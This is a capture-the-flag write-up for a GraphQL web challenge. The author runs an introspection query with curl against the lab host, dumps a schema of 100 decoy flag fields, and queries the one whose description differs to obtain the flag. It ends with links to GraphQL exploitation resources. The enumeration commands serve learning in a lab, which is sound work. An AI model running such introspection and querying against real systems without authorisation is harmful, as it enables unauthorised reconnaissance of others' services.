# x=-y (100pts)
Type: Web Application
## Brief 
> It is all going downhill from here! Did you not see that math equation
## Process
#### 1. Opened link, presented with this webpage: 
Video Clue: "loOk aT tHiS ~~photo~~gRapH" - Nickelback

![nickelback](https://user-images.githubusercontent.com/30396122/205576506-9d79f55d-94df-4187-9a7c-9ee617dbf37a.png)

Thinking: Okay graph and math (x=-y)

#### 2. Looked at source code: 

The source code included another clue, which was a console log that said something along the lines of this website is using graphQL. 
#### 3. Research: 

Probably way too much research for the task at hand... Anyway now I know --too much-- about graphQL. 

**Relevant Research to this CTF** 
* [John Hammond's Video on GraphQL](https://www.youtube.com/watch?v=0wPKzinwM7A&ab_channel=JohnHammond)
* [Introspect Query](https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da) 

> **Note**
> Extra Research (Things that could be helpful for other GraphQL challenges) is located at the end of this document... 
 
#### 4. From Research Found Access Point to GraphQL 
```
http://web-1/**graphql** 
```
#### 5. Used Introspect Query to drop entire data contents of graphQL application  
```
curl -s http://web-1/graphql -H "Content-Type: application/json" -d '{ "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }" }' | jq -c
```
** Result - Narrowed down to area of interest (entries with the prefix of flag, followed by a number): **  
```
"types":[{"kind":"OBJECT","name":"Query","description":null,"fields":[{"name":"flag1","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag2","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag3","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag4","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag5","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag6","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag7","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag8","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag9","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag10","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag11","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag12","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag13","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag14","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag15","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag16","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag17","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag18","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag19","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag20","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag21","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag22","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag23","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag24","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag25","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag26","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag27","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag28","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag29","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag30","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag31","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag32","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag33","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag34","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag35","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag36","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag37","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag38","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag39","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag40","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag41","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag42","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag43","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag44","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag45","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag46","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag47","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag48","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag49","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag50","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag51","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag52","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag53","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag54","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag55","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag56","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag57","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag58","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag59","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag60","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag61","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag62","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag63","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag64","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag65","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag66","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag67","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag68","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag69","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag70","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag71","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag72","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag73","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag74","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag75","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag76","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag77","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag78","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag79","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag80","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag81","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag82","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag83","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag84","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag85","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag86","description":"This method is not not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag87","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag88","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag89","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag90","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag91","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag92","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag93","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag94","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag95","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag96","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag97","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag98","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag99","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null},{"name":"flag100","description":"This method is not correct","args":[],"type":{"kind":"SCALAR","name":"String","ofType":null},"isDeprecated":false,"deprecationReason":null}],
```
#### 6. Seperated the text relevant to flags by newline characters and found the following:
![drop_2](https://user-images.githubusercontent.com/30396122/205571544-b750925a-c5de-4259-9203-a12651f61de4.png)

As highlighted in the image above, by seperating the entries by line it was found that one flag had a double negative = this is the right method!
#### 7. Queried the associated flag with the double negative statement: 
```
curl -s http://web-1/graphql -H "Content-Type: application/json" -d '{ "query": "{flag86}" }' | jq -c
```
#### 8. Flag! 
```
WACTF{look_at_this_graph_was_made_in_2015_I_am_getting_too_old}
```

## Conclusion 
Fun and easy challenge, could have solved it much earlier however our team didn't look closely at the dump of data and seperate it by line until the second day of the CTF.

## Extra Resources 
**Video Resources:** 
* [Hacking Simplified Video on GraphQL - Part 1](https://www.youtube.com/watch?v=w0QOAacuPgQ&ab_channel=HackingSimplified)
* [Hacking Simplified Video on GraphQL - Part 2](https://www.youtube.com/watch?v=YA-mL9Z8SNI&ab_channel=HackingSimplified) 
* [Cyber Security TV Video on How to exploit GraphQL](https://www.youtube.com/watch?v=fszVtstHvgE&list=RDLVYA-mL9Z8SNI&index=5&ab_channel=CyberSecurityTV) 

**CTF walkthroughs:** 
* [0xdf hacks stuff](https://0xdf.gitlab.io/2019/06/08/htb-help.html) 
* [Jamie Light Foot Blog - 2019 Hack in Paris CTF, Meet Your Doctor GraphQL](https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/)  
* [ctftime writeup 7475](https://ctftime.org/writeup/7475) 

**Other** 
* [OWASP CheatSheet for GraphQL](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html) 
* [wafw00f](https://github.com/EnableSecurity/wafw00f) 
* [Blog Assetnote - Exloiting GraphQL](https://blog.assetnote.io/2021/08/29/exploiting-graphql/) 
